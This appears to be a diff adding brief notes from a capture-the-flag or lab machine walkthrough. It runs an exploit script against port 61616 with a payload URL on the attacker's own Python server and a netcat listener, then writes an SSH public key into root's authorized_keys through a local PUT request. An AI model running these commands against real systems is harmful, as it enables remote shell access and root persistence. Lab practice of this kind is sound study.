@@ -1,0 +1,5 @@
+run exploit script(but it must edit ip and port in xml file and create python server with port 8001 and create listener with netcat)
+python3 exploit.py -i 10.10.11.243 -p 61616 -u http://10.10.14.30:8001/poc.xml
+
+write id_rsa.pub into root
+curl -X PUT http://localhost:1337/root/.ssh/authorized_keys -d "$(cat ~/.ssh/id_rsa.pub)"
